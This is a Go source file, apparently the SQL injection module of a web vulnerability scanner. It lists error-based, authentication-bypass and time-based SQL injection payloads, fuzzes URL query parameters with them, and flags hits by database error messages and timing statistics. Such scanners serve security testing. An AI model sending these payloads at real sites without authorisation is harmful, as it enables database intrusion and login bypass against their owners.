package sqli

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
	"unicode"

	"github.com/yupiyy/bhyakugan/internal/core"
	"github.com/yupiyy/bhyakugan/internal/payloadrepo"
	"github.com/yupiyy/bhyakugan/internal/utils"
)

type SQLiPayload struct {
	Name     string
	Payload  string
	Type     string
	Expected string
}

const (
	baselineSampleCount = 5
	timeZScoreThreshold = 3.0
	minTimeDeltaSeconds = 2.5
	minTimeDiffEntropy  = 0.08
	minTimeStdDevFloor  = 0.05
	maxDisplayedZScore  = 200.0
)

type timingBaseline struct {
	mean                 float64
	stdDev               float64
	bodyHash             string
	timeDetectionEnabled bool
}

type timedHTTPResponse struct {
	duration   float64
	statusCode int
	bodyLower  string
	bodyHash   string
	redirects  int
	err        error
}

var DBErrors = map[string][]string{
	"MySQL":      {"you have an error in your sql syntax", "warning: mysql_", "mysql_fetch_array()", "valid mysql result", "SQLSTATE[42000]", "Syntax error or access violation"},
	"PostgreSQL": {"postgresql query failed", "pg_query(): query error", "error: syntax error at or near"},
	"MSSQL":      {"unclosed quotation mark after the character string", "driver] [microsoft][sql server native client", "sqlserver error", "SQL Server Error"},
	"Oracle":     {"ora-00933: sql command not properly ended", "ora-01756: quoted string not properly terminated", "ORA-01476"},
	"SQLite":     {"sqlite3::query():", "warning: sqlite_"},
}

var SQLPayloads = []SQLiPayload{
	{"SQLi Error (Single Quote)", "'", "Error", ""},
	{"SQLi Error (Double Quote)", "\"", "Error", ""},
	{"SQLi Error (MySQL ExtractValue)", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))#", "Error", ""},
	{"SQLi Error (MSSQL Convert)", "' AND 1=CONVERT(int,(SELECT @@version))--", "Error", ""},
	{"SQLi Error (Postgres Cast)", "' AND 1=CAST(version() AS INTEGER)--", "Error", ""},
	{"SQLi Auth Bypass (Tautology)", "' OR '1'='1", "Auth", ""},
	{"SQLi Auth Bypass (Admin)", "admin' --", "Auth", ""},
	{"SQLi Auth Bypass (Limit)", "' OR 1=1 LIMIT 1 --", "Auth", ""},
	{"SQLi Auth Bypass (MD5 Hack)", "ffifdyop", "Auth", ""},
	{"SQLi Time (MySQL RLIKE)", "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a) RLIKE '1'--", "Time", ""},
	{"SQLi Time (MySQL ELT)", "' OR ELT(1=1,SLEEP(5))--", "Time", ""},
	{"SQLi Time (MySQL BENCHMARK)", "' AND BENCHMARK(5000000,MD5('test'))--", "Time", ""},
	{"SQLi Time (Postgres pg_sleep)", "'; SELECT pg_sleep(5)--", "Time", ""},
	{"SQLi Error (Polyglot)", "sleep(5)/*' or sleep(5) or '\" or sleep(5) or \"*/", "Time", ""},
}

func loadPATTTTimePayloads() []SQLiPayload {
	lines := payloadrepo.LoadLines("SQL Injection/Intruder/Generic_TimeBased.txt", 120)
	if len(lines) == 0 {
		return nil
	}
	out := make([]SQLiPayload, 0, 30)
	seen := make(map[string]bool)
	for _, l := range lines {
		p := strings.TrimSpace(l)
		lp := strings.ToLower(p)
		if p == "" || seen[p] {
			continue
		}
		// Keep only explicit DB sleep primitives; benchmark/randomblob is too noisy.
		if strings.Contains(lp, "sleep(5)") ||
			strings.Contains(lp, "waitfor delay") ||
			strings.Contains(lp, "pg_sleep(5)") {
			seen[p] = true
			out = append(out, SQLiPayload{
				Name:    "SQLi Time (PATTT)",
				Payload: p,
				Type:    "Time",
			})
			if len(out) >= 8 {
				break
			}
		}
	}
	return out
}

func Scan(baseURL string, client *http.Client, ctx core.ScanContext, onFound func(core.Finding)) {
	
	lowerURL := strings.ToLower(baseURL)
	if strings.HasSuffix(lowerURL, ".js") || strings.HasSuffix(lowerURL, ".css") ||
		strings.HasSuffix(lowerURL, ".png") || strings.HasSuffix(lowerURL, ".jpg") ||
		strings.HasSuffix(lowerURL, ".jpeg") || strings.HasSuffix(lowerURL, ".gif") ||
		strings.HasSuffix(lowerURL, ".svg") || strings.HasSuffix(lowerURL, ".ico") ||
		strings.HasSuffix(lowerURL, ".woff") || strings.HasSuffix(lowerURL, ".woff2") ||
		strings.HasSuffix(lowerURL, ".ttf") || strings.HasSuffix(lowerURL, ".eot") {
		return
	}

	u, err := url.Parse(baseURL)
	if err != nil {
		return
	}
	q := u.Query()

	baseline, baselineBodyLower, err := collectBaseline(baseURL, client, baselineSampleCount)
	if err != nil {
		return
	}

	if baseline.mean > 3.0 {
		return
	}

	var wg sync.WaitGroup
	sem := make(chan struct{}, 5)
	var foundMu sync.Mutex
	isAlreadyVulnerable := false
	allPayloads := append(append([]SQLiPayload{}, SQLPayloads...), loadPATTTTimePayloads()...)

	// Proactive Parameter Discovery (inspired by "One Apostrophe" report)
	sensitiveParams := []string{"companyID", "fundId", "userId", "id", "accountId", "orgId"}

	for _, p := range allPayloads {
		if isAlreadyVulnerable {
			break
		}
		wg.Add(1)
		go func(payload SQLiPayload) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			if isAlreadyVulnerable {
				return
			}

			// 1. Fuzz existing query parameters
			if len(q) > 0 {
				for param := range q {
					fuzzU, _ := url.Parse(baseURL)
					fuzzQ := fuzzU.Query()
					fuzzQ.Set(param, payload.Payload)
					fuzzU.RawQuery = fuzzQ.Encode()
					target := fuzzU.String()
					checkTarget(target, payload, client, baseline, baselineBodyLower, &isAlreadyVulnerable, &foundMu, onFound)
					if isAlreadyVulnerable {
						return
					}
				}
			}

			// 2. Proactively inject sensitive parameters even if not present
			for _, sp := range sensitiveParams {
				if q.Get(sp) != "" {
					continue // Already fuzzed in step 1
				}
				fuzzU, _ := url.Parse(baseURL)
				fuzzQ := fuzzU.Query()
				fuzzQ.Set(sp, payload.Payload)
				fuzzU.RawQuery = fuzzQ.Encode()
				target := fuzzU.String()
				if payload.Name == "SQLi Error (Single Quote)" {
					
				}
				checkTarget(target, payload, client, baseline, baselineBodyLower, &isAlreadyVulnerable, &foundMu, onFound)
				if isAlreadyVulnerable {
					return
				}
			}

			// 3. Fallback fuzzing if no params at all
			if len(q) == 0 {
				target := baseURL + "?id=" + url.QueryEscape(payload.Payload)
				checkTarget(target, payload, client, baseline, baselineBodyLower, &isAlreadyVulnerable, &foundMu, onFound)
			}
		}(p)
	}
	wg.Wait()
	ScanOracleLengthFilter(baseURL, client, onFound)
}

func checkTarget(target string, payload SQLiPayload, client *http.Client, baseline timingBaseline, baselineBodyLower string, isAlreadyVulnerable *bool, foundMu *sync.Mutex, onFound func(core.Finding)) {
	res := performTimedRequest(client, target)
	if res.err != nil {
		return
	}

	isVulnerable := false
	detail := ""
	confidence := "probable"
	severity := "Medium"

	for db, errors := range DBErrors {
		for _, errStr := range errors {
			if strings.Contains(res.bodyLower, strings.ToLower(errStr)) {
				if strings.Contains(baselineBodyLower, strings.ToLower(errStr)) {
					continue
				}
				isVulnerable = true
				detail = fmt.Sprintf("CRITICAL Error-based SQL Injection: found %s error marker (%s). This confirms the input is directly reaching the database query.", db, errStr)
				confidence = "confirmed"
				severity = "Critical"
				break
			}
		}
		if isVulnerable {
			break
		}
	}

	if !isVulnerable && strings.Contains(payload.Name, "Time") {
		if !baseline.timeDetectionEnabled {
			return
		}
		// HTTP 000 guard.
		if res.statusCode == 0 {
			return
		}
		// Redirect guard.
		if res.redirects > 1 {
			return
		}
		if res.statusCode == 403 || res.statusCode == 406 || res.statusCode == 429 {
			return
		}
		// Body hash guard.
		if res.bodyHash == baseline.bodyHash {
			return
		}
		margin1 := res.duration - baseline.mean
		if margin1 < minTimeDeltaSeconds {
			return
		}
		entropy1 := responseDiffEntropy(baselineBodyLower, res.bodyLower)
		if entropy1 < minTimeDiffEntropy {
			return
		}
		z1Raw := computeZScore(res.duration, baseline.mean, baseline.stdDev)
		if z1Raw < timeZScoreThreshold {
			return
		}
		z1 := clampZScore(z1Raw)

		verifyRes := performTimedRequest(client, target)
		if verifyRes.err != nil {
			return
		}
		// HTTP 000 guard.
		if verifyRes.statusCode == 0 {
			return
		}
		// Redirect guard.
		if verifyRes.redirects > 1 {
			return
		}
		if verifyRes.statusCode == 403 || verifyRes.statusCode == 406 || verifyRes.statusCode == 429 {
			return
		}
		// Body hash guard.
		if verifyRes.bodyHash == baseline.bodyHash {
			return
		}
		margin2 := verifyRes.duration - baseline.mean
		if margin2 < minTimeDeltaSeconds {
			return
		}
		entropy2 := responseDiffEntropy(baselineBodyLower, verifyRes.bodyLower)
		if entropy2 < minTimeDiffEntropy {
			return
		}
		z2Raw := computeZScore(verifyRes.duration, baseline.mean, baseline.stdDev)
		if z2Raw < timeZScoreThreshold {
			return
		}
		z2 := clampZScore(z2Raw)

		isVulnerable = true
		if margin1 >= 2.0 && margin2 >= 2.0 && z1Raw >= 4.5 && z2Raw >= 4.5 {
			confidence = "probable"
		} else {
			confidence = "probable"
		}
		severity = "Medium"
		detail = fmt.Sprintf("Time-Based SQLi signal (baseline_mean=%.2fs baseline_std=%.3f req1=%.2fs[z=%.2f,delta=%.2f,entropy=%.2f] req2=%.2fs[z=%.2f,delta=%.2f,entropy=%.2f]).",
			baseline.mean, baseline.stdDev, res.duration, z1, margin1, entropy1, verifyRes.duration, z2, margin2, entropy2)
	}

	if isVulnerable {
		foundMu.Lock()
		if !*isAlreadyVulnerable {
			*isAlreadyVulnerable = true
			fmt.Printf("[!] POSITIVE MATCH: %s at %s\n", payload.Name, target)
			onFound(core.Finding{Type: "SQL Injection", Target: target, Detail: detail, Severity: severity, Confidence: confidence})
		}
		foundMu.Unlock()
	}
}

func collectBaseline(target string, client *http.Client, sampleCount int) (timingBaseline, string, error) {
	samples := make([]float64, 0, sampleCount)
	hashFreq := make(map[string]int, sampleCount)
	baselineBodyLower := ""
	enableTimeDetection := true

	for i := 0; i < sampleCount; i++ {
		res := performTimedRequest(client, target)
		if res.err != nil {
			return timingBaseline{}, "", res.err
		}
		if baselineBodyLower == "" {
			baselineBodyLower = res.bodyLower
		}
		samples = append(samples, res.duration)
		hashFreq[res.bodyHash]++
		if res.statusCode == 0 {
			enableTimeDetection = false
		}
		if res.redirects > 1 {
			enableTimeDetection = false
		}
	}

	mean, stdDev := computeMeanStdDev(samples)
	return timingBaseline{
		mean:                 mean,
		stdDev:               stdDev,
		bodyHash:             dominantHash(hashFreq),
		timeDetectionEnabled: enableTimeDetection,
	}, baselineBodyLower, nil
}

func performTimedRequest(client *http.Client, target string) timedHTTPResponse {
	start := time.Now()
	req, errReq := http.NewRequest("GET", target, nil)
	if errReq != nil {
		return timedHTTPResponse{err: errReq}
	}
	utils.SetDefaultHeaders(req, target)
	resp, err := client.Do(req)
	duration := time.Since(start).Seconds()
	if err != nil {
		return timedHTTPResponse{duration: duration, statusCode: 0, err: err}
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	return timedHTTPResponse{
		duration:   duration,
		statusCode: resp.StatusCode,
		bodyLower:  strings.ToLower(string(bodyBytes)),
		bodyHash:   hashBody(bodyBytes),
		redirects:  countRedirects(resp),
	}
}

func hashBody(body []byte) string {
	sum := sha256.Sum256(body)
	return hex.EncodeToString(sum[:])
}

func dominantHash(freq map[string]int) string {
	bestHash := ""
	bestCount := -1
	for h, c := range freq {
		if c > bestCount {
			bestHash = h
			bestCount = c
		}
	}
	return bestHash
}

func countRedirects(resp *http.Response) int {
	if resp == nil || resp.Request == nil {
		return 0
	}
	count := 0
	for prev := resp.Request.Response; prev != nil; prev = prev.Request.Response {
		count++
	}
	return count
}

func computeMeanStdDev(samples []float64) (float64, float64) {
	if len(samples) == 0 {
		return 0, 0
	}
	sum := 0.0
	for _, sample := range samples {
		sum += sample
	}
	mean := sum / float64(len(samples))
	variance := 0.0
	for _, sample := range samples {
		diff := sample - mean
		variance += diff * diff
	}
	variance /= float64(len(samples))
	return mean, math.Sqrt(variance)
}

func computeZScore(attackTime, meanBaseline, stdDev float64) float64 {
	effectiveStdDev := math.Max(stdDev, minTimeStdDevFloor)
	if effectiveStdDev <= 0 {
		if attackTime > meanBaseline {
			return math.Inf(1)
		}
		if attackTime < meanBaseline {
			return math.Inf(-1)
		}
		return 0
	}
	return (attackTime - meanBaseline) / effectiveStdDev
}

func clampZScore(z float64) float64 {
	if z > maxDisplayedZScore {
		return maxDisplayedZScore
	}
	if z < -maxDisplayedZScore {
		return -maxDisplayedZScore
	}
	return z
}

func responseDiffEntropy(base, attack string) float64 {
	baseTokens := tokenizeForEntropy(base)
	attackTokens := tokenizeForEntropy(attack)
	if len(baseTokens) == 0 && len(attackTokens) == 0 {
		return 0
	}

	union := make(map[string]struct{}, len(baseTokens)+len(attackTokens))
	for _, t := range baseTokens {
		union[t] = struct{}{}
	}
	intersection := 0
	baseSet := make(map[string]struct{}, len(baseTokens))
	for _, t := range baseTokens {
		baseSet[t] = struct{}{}
	}
	for _, t := range attackTokens {
		if _, ok := baseSet[t]; ok {
			intersection++
		}
		union[t] = struct{}{}
	}

	if len(union) == 0 {
		return 0
	}
	jaccard := float64(intersection) / float64(len(union))
	return 1.0 - jaccard
}

func tokenizeForEntropy(s string) []string {
	normalized := strings.Map(func(r rune) rune {
		if unicode.IsLetter(r) || unicode.IsDigit(r) {
			return unicode.ToLower(r)
		}
		return ' '
	}, s)
	return strings.Fields(normalized)
}
